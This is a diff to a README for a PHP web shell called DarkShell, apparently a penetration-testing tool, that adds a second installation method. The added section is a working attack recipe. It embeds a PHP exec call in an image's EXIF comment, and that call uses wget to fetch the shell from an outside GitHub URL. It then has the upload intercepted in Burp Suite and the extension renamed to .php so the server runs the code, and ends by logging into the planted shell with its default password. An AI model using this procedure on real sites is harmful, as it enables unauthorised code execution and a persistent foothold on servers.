@@ -31,6 +31,26 @@ Modified from the original to be used more safely during Penetration Testing and
 
 4. Enter password: `YouHaveBeenHacked!` if you have not changed it. Are you sure you don't want to change huh?!
 
+### Installation 2
+Upload an image with "PHP command" in comment section and tamper file extension during upload
+
+1) Edit Image:
+   ```bash
+   exiftool -Comment="<?php exec('wget -O ds.php https://raw.githubusercontent.com/DarkSolo/DarkShell/refs/heads/main/DarkShell.php'); ?>" filename.jpg
+   ```
+
+2) Upload Image:<br>
+- Go to user profile -> photo
+- Upload filename.jpg
+- Intercept data with Burp Suite and tamper <b>filename.jpg</b> to <b>filename.php</b>
+
+3) Check upload and got shell:
+- Visit filename.php to exec command and download full shell
+- Visit ds.php
+- If exist you got a full shell!
+
+4) Enter password: `YouHaveBeenHacked!` if you have not changed it. Are you sure you don't want to change huh?!
+
 ### Usage
 
 Once logged in, you can start entering shell commands in the provided input field. Use commands such as:
